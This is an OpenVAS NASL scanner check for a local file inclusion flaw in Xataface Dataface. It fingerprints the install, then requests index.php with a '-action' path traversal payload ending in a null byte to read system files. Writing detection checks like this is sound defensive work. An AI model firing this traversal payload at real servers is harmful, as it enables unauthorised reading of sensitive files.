###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xdataface_dataface_lfi_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Xataface Dataface '-action' Local File Inclusion Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801950");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_bugtraq_id(48126);
  script_tag(name:"cvss_base", value:"6.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:P/I:P/A:P");
  script_name("Xataface Dataface '-action' Local File Inclusion Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17367/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/102056/dataface-lfi.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the web server process.");
  script_tag(name:"affected", value:"Xataface Dataface version 1.3rc3 and prior.");
  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  via the '-action' parameter to 'index.php', which allows attackers to read arbitrary
  files via a ../(dot dot) sequences.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Xataface Dataface and is prone to local file
  inclusion vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/Xdataface", "/dataface", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  req = http_get(item: dir + "/dataface_info.php", port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  if('>INSTALLED CORRECTLY </' >< res && 'Xataface Web Application Framework<' >< res)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      url = string(dir, "/index.php?-action=../../../../../../../",
                       files[file],'%00');
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit(99);